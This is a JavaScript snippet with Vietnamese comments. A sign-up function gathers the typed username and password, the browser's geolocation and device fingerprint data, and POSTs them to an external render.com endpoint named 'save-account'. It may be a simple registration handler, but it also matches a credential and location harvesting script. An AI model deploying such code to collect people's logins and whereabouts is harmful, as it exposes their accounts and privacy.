function dangKy() {
    // Lấy thông tin trình duyệt từ file check_browser.js
    const thongTinMay = layThongTinMay(); 

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            const usernameInput = document.getElementById('username'); 
            const passwordInput = document.getElementById('password');

            if (!usernameInput || !passwordInput) return;

            const data = {
                username: usernameInput.value,
                password: passwordInput.value,
                location: position.coords.latitude + "," + position.coords.longitude,
                device_info: thongTinMay // GOM CHUNG VÀO ĐÂY!
            };
            
            guiDuLieu(data);
        }, function(error) {
            dangKyKhongViTri(thongTinMay); 
        });
    } else {
        dangKyKhongViTri(thongTinMay);
    }
}

// Hàm gửi chung để đỡ phải viết đi viết lại
function guiDuLieu(data) {
    fetch('https://cua-og.render.com/api/save-account', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    })
    .then(response => response.ok ? console.log("Ngon lành!") : console.log("Lỗi rồi og ơi"))
    .catch(err => console.error("Lỗi mạng:", err));
}

function dangKyKhongViTri(thongTinMay) {
    const data = {
        username: document.getElementById('username').value,
        password: document.getElementById('password').value,
        location: "Không cho phép",
        device_info: thongTinMay
    };
    guiDuLieu(data);
}